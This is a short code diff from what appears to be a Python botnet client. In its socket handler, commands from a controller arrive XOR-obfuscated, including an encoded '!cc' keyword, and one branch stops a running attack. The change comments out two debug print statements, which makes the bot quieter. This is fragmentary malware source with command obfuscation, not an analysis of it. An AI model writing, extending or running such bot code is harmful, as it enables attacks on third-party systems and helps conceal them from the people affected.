@@ -251,12 +251,12 @@ def handle(sock):
 		tmp = sock.recv(1024).decode()
 		if len(tmp) == 0:
 			break#return main loop
-		print(tmp)
+		#print(tmp)
 		data = xor_dec(tmp,key)
 		if data[0] == '!':
 			try:
 				command = data.split()
-				print(command)
+				#print(command)
 				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
 					if attack != 0:
 						stop = True
